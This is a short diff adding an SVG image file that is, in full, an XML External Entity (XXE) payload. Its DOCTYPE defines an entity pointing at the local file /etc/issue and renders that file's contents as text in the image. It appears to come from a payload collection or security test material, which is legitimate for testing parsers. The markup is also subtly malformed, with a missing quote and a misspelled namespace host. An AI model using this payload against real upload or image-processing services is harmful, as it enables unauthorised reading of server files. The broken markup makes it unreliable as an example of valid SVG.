@@ -1,0 +1,6 @@
+<!DOCTYPE svg[
+	<!ENTITY file SYSTEM "file:///etc/issue">
+]>
+<svg xmlns=https://wwww.w3.org/2000/svg" width="120cm" height="120cm">
+	<text x="20" y="35" >&file;</text>
+</svg>
